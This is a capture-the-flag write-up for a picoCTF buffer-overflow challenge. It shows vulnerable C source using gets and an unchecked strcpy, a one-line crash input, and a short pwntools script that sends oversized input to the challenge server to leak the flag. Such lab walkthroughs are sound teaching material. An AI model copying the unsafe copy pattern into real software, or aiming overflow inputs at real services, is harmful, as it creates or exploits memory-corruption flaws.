## Understanding the Challenge
The challenge gives us a binary file (`vuln`) and its source code (`vuln.c`). The goal is to exploit a buffer overflow vulnerability to change a variable's value and make the program reveal the flag. Sounds fun, right? Let's get started!

## Understanding theÂ Code
First, let's take a look at the source code to see what we're dealing with:

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

## Whatâ€™s Happening Here?

**1. Buffer Overflow Vulnerability:**
The vuln function has a buffer (`buf2`) thatâ€™s only 16 bytes long. The program uses `strcpy` to copy user input into this buffer, but it doesnâ€™t check the length of the input. This means if we give it more than 16 bytes, we can overwrite other parts of memory!

**2. Signal Handler:**
If a segmentation fault occurs (e.g., due to a buffer overflow), the `sigsegv_handler` function is triggered, which prints the flag.

**3. User Input:**
The main function reads user input using `gets`, which is notoriously unsafe because it doesnâ€™t limit the amount of input. This input is then passed to the `vuln` function.

**4. Key Takeaways:**
The program reads the flag from `flag.txt` and stores it in a global variable flag.
The `gets(buf1)`; function is used, which is dangerous because it doesnâ€™t check input length.
The function `vuln()` uses `strcpy(buf2, input);`, which can lead to buffer overflow since `buf2` is only 16 bytes long.
If we trigger a segmentation fault `(SIGSEGV)`, the handler will print the flag!

## Exploitation Plan
To solve this challenge, we need to:

1. **Overflow the Buffer:** Send more than 16 bytes of input to cause a buffer overflow.

2. **Trigger a Segmentation Fault:** The overflow will cause the program to crash, triggering the `sigsegv_handler` and printing the flag.

We can use the given binary and provide an oversized input to trigger a segmentation fault and leak the flag:

```python
python3 -c 'print("A" * 32)' | ./vuln
```

Or we can use the given remote server as below as well.

## Step 1: Creating the Payload
We need to send an input that:

- Fills the 16-byte buffer in the `vuln` function.

- Overflows the buffer to cause a segmentation fault.

In Python, we can create this payload like this:

```python
payload = b"A" * 32  # More than enough to overflow the buffer
```

## Hereâ€™s whatâ€™s happening:

`b"A" * 32:` Sends 32 bytes of the letter `A`. This is way more than the 16 bytes the buffer can hold, so it will overflow and cause a crash.

## Step 2: Send the Payload
Weâ€™ll use a Python script to send our payload to the remote server. Hereâ€™s the script:

```python
from pwn import *

# Connect to the challenge server
conn = remote('saturn.picoctf.net', 51086)

# Creating the payload
payload = b"A" * 32

# Send the payload
conn.sendline(payload)

# Receive the flag
print(conn.recvall().decode())

```

## Whatâ€™s This Script Doing?

1. Connecting to the Server:
The `remote` function connects to the challenge `server at saturn.picoctf.net` on port `51086`.

2. Sending the Payload:
The `sendline` function sends our crafted payload to the server.

3. Receiving the Flag:
The `recvall` function grabs the serverâ€™s response, which should include the flag.

## Step 3: Run the Script

Save the script as `exploit.py` and run it:

```python
python3 exploit.py
```

If everything works correctly, youâ€™ll see the flag printed on your screen! ðŸŽ‰

## What Happened?
When we send more than 16 bytes of input, the extra data overflows the `buf2` buffer and corrupts the programâ€™s memory. This causes a segmentation fault, which triggers the `sigsegv_handler` function. The handler then prints the flag for us.

## Final Thoughts
This challenge is a great way to learn about buffer overflows and how they can be exploited to manipulate a programâ€™s behavior. By causing a crash, we can trigger a signal handler that reveals the flag. Once you understand the basics, you can tackle more advanced challenges!

Flag: `picoCTF{...}` (Youâ€™ll see the actual flag when you run the exploit!)
